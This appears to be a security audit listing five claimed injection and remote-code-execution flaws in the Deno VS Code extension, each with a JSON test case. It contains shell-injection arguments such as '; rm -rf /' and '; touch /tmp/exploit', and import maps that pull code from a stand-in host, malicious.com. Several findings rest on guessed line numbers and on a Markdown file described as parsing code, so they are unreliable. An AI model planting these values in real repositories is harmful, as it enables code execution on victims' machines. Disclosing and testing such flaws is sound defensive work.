# Vulnerability List

## Vulnerability Name: Command Injection via Deno CLI Task Definitions
**Description**:
The extension executes Deno CLI tasks defined in configuration files like `deno.json`. Attackers can craft malicious task definitions with injected command arguments, leading to arbitrary command execution. The `buildDenoTask` function in `tasks.ts` constructs command-line arguments directly from the `args` field of user-provided task definitions without proper sanitization. An attacker can create a malicious task in their repository that executes arbitrary commands via shell metacharacters (e.g., `; rm -rf /`).

**Steps to Trigger**:
1. Create a malicious repository with a `deno.json` file containing a task with malicious `args`.
2. The victim opens the repository in VS Code, enabling the Deno extension.
3. The attacker triggers the task (e.g., via the Tasks sidebar or keyboard shortcut).

**Impact**:
Remote attackers can execute arbitrary code on the victim's machine with the same privileges as the VS Code process, leading to full system compromise.

**Rank**: Critical
**Currently Implemented Mitigations**: None. The code directly uses user-provided arguments without sanitization.
**Missing Mitigations**: Validate and escape arguments to prevent shell injection. Limit allowed command patterns.
**Preconditions**: Victim must have the Deno extension installed and execute the malicious task.
**Source Code Analysis**:
- `tasks.ts:buildDenoTask` constructs the command using `args` (line ~60).
- `args` are directly taken from user-configured tasks in `deno.json`.
- No validation/sanitization occurs for special shell characters.

**Security Test Case**:
1. Create a test repository with a `deno.json` task:
```json
{
  "tasks": {
    "malicious_task": {
      "command": "run",
      "args": ["--", "echo 'ATTACK' > /tmp/injected.txt && echo 'PAYLOAD'"]
    }
  }
}
```
2. Open the repository in VS Code and run the task via the extension's task runner.
3. Observe that the injected command executes and creates `/tmp/injected.txt`.

---

## Vulnerability Name: Code Injection via Malicious Import Maps
**Description**:
The extension supports import maps (`deno.json`/`import_map.json`) to redirect module imports. Attackers can configure malicious entries to load hostile code from remote URLs, which the Deno language server executes. The import map parsing in `ImportCompletions.md` and `commands.ts` does not validate or restrict remote origins, allowing attackers to inject malicious modules that execute arbitrary code.

**Steps to Trigger**:
1. Create a repository with an `import_map.json` redirecting a standard module to an attacker-controlled URL.
2. The victim opens the repository, enabling Deno. The language server loads modules via the import map, executing malicious code.

**Impact**:
Attackers can execute arbitrary Deno scripts, leading to RCE or data theft.

**Rank**: High
**Currently Implemented Mitigations**: None. The feature trusts user-supplied import maps by default.
**Missing Mitigations**: Validate import origins, block untrusted domains, or prompt users before enabling external imports.
**Preconditions**: Victim must parse a malicious import map.
**Source Code Analysis**:
- `constants.ts` includes `deno.import_map` settings.
- `commands.ts` handles `deno.importMap` without URL validation in `transformDenoConfiguration`.

**Security Test Case**:
1. Create an `import_map.json`:
```json
{
  "imports": {
    "std": "https://malicious.com/exploit.ts"
  }
}
```
2. Open the repo in VS Code and import a module like `import * from "std"`.
3. The malicious server returns code that writes to disk or exfiltrates data.

---

## Vulnerability Name: RCE via Malicious Deno Path Configuration
**Description**:
The `deno.path` setting allows users to specify a custom Deno executable path. Attackers can set this to a path controlled by them (e.g., `../../../../malicious/deno`), leading the extension to execute a malicious binary. The `getDenoCommandPath` in `util.ts` does not validate the path properly, allowing arbitrary executable execution.

**Steps to Trigger**:
1. Modify a repository's settings to set `deno.path` to a malicious path.
2. The victim opens the repo, and the extension runs the malicious binary.

**Impact**:
Arbitrary code execution with system privileges.

**Rank**: Critical
**Currently Implemented Mitigations**: None. Path is used directly.
**Missing Mitigations**: Validate paths to ensure they point to trusted Deno binaries.
**Preconditions**: Victim must load settings from the malicious repository.
**Source Code Analysis**:
- `util.ts:getDenoCommandPath` reads `deno.path` without validation (line ~45).

**Security Test Case**:
1. Set `deno.path` to a malicious script in the repository.
2. The script could be a shell script that writes to `/tmp/exploit`.
3. Trigger a Deno command via the extension (e.g., "Deno: Cache").

---

## Vulnerability Name: RCE via Test Command Arguments
**Description**:
The `test` command in `commands.ts` constructs Deno CLI commands using user-provided `testArgs` (like `--unstable` flags). Malicious configurations could inject commands via `testArgs` to execute arbitrary code.

**Steps to Trigger**:
1. Modify `deno.json` to set testArgs with shell metacharacters.
2. Run tests via the extension, executing injected commands.

**Impact**:
Arbitrary command execution.

**Rank**: High
**Currently Implemented Mitigations**: None.
**Missing Mitigations**: Sanitize arguments.

**Security Test Case**:
1. Set `testArgs` in `deno.json`:
```json
{ "testArgs": ["; touch /tmp/exploit"] }
```
2. Run tests and observe file creation.

---

## Vulnerability Name: Code Injection via Unvalidated Deno Configuration
**Description**:
The extension loads `deno.json` configurations without validating user-supplied settings, allowing malicious configurations to load untrusted modules or execute code via Deno's unstable features.

**Steps to Trigger**:
1. Include malicious `deno.json` enabling unstable features to run hostile code.

**Impact**:
Arbitrary code execution via Deno scripting.

**Rank**: High
**Currently Implemented Mitigations**: None. The feature trusts user-supplied configurations by default.
**Missing Mitigations**: Validate configuration fields to block untrusted module imports or unsafe flags.
**Preconditions**: Victim must load the malicious configuration.
**Source Code Analysis**:
- `commands.ts` processes `deno.json` without validating or restricting configuration fields.

**Security Test Case**:
1. Create a `deno.json` with:
```json
{
  "unstable": true,
  "importMap": "https://malicious.com/malicious_import_map.json"
}
```
2. The malicious import map loads hostile code (e.g., `import { exploit } from "https://malicious.com/exploit.ts"`).
3. Execute a Deno command (e.g., "Deno: Run") that triggers the malicious module.

---

**Summary**:
The Deno extension’s failure to validate user-provided configurations, paths, and task definitions introduces critical RCE and Code Injection vulnerabilities. Proper input sanitization and configuration validation are urgently needed to mitigate these risks.
